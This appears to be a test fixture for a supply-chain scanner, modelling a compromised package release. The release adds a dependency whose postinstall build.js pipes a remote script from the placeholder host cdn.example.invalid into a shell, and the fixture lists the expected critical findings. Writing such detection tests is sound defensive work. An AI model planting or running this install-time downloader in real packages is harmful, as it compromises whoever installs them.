@@ -1,0 +1,72 @@
+{
+  "id": "added-dependency-install-downloader",
+  "title": "A legitimate parent adds a dependency whose build step downloads a payload",
+  "category": "dependency-introduction",
+  "intent": "Models the 2026 arrayref incident: a compromised release of an otherwise legitimate package adds a new runtime dependency, and that dependency's postinstall build step pipes a remote script into a shell. The parent's own bytes are unremarkable — the whole signal lives in the dependency artifact, which Drydock fetches and scans. Endpoints are example.invalid and no real payload is present.",
+  "previousPackageJson": {
+    "name": "arrayref-like",
+    "version": "0.3.9",
+    "main": "index.js"
+  },
+  "stagedPackageJson": {
+    "name": "arrayref-like",
+    "version": "0.3.10",
+    "main": "index.js",
+    "dependencies": { "proc-macro1": "0.1.0" }
+  },
+  "dependencyArtifacts": {
+    "proc-macro1": {
+      "version": "0.1.0",
+      "packageJson": {
+        "name": "proc-macro1",
+        "version": "0.1.0",
+        "main": "index.js",
+        "scripts": { "postinstall": "node build.js" }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 140,
+          "sha256": "dep-package-json",
+          "flags": [],
+          "textSample": "{\"name\":\"proc-macro1\",\"version\":\"0.1.0\",\"main\":\"index.js\",\"scripts\":{\"postinstall\":\"node build.js\"}}"
+        },
+        {
+          "path": "build.js",
+          "size": 180,
+          "sha256": "dep-build-js",
+          "flags": [],
+          "textSample": "const { execSync } = require('child_process');\nexecSync('curl -sL https://cdn.example.invalid/stage2.sh | sh');\n"
+        },
+        {
+          "path": "index.js",
+          "size": 40,
+          "sha256": "dep-index-js",
+          "flags": [],
+          "textSample": "module.exports = function macro() {};\n"
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "proc-macro1",
+      "section": "dependencies",
+      "declaredSpec": "0.1.0",
+      "declarationKind": "exact",
+      "status": "inspected",
+      "resolvedVersion": "0.1.0",
+      "observation": { "execution": "observed", "risk": "observed" },
+      "automaticExecution": [{ "kind": "script", "name": "postinstall" }]
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency.install-time-capability",
+      "severity": "critical",
+      "file": "<dependency>proc-macro1@0.1.0:package.json"
+    }
+  ],
+  "expectedRisk": "critical",
+  "expectedRecommendation": "block manual approval"
+}
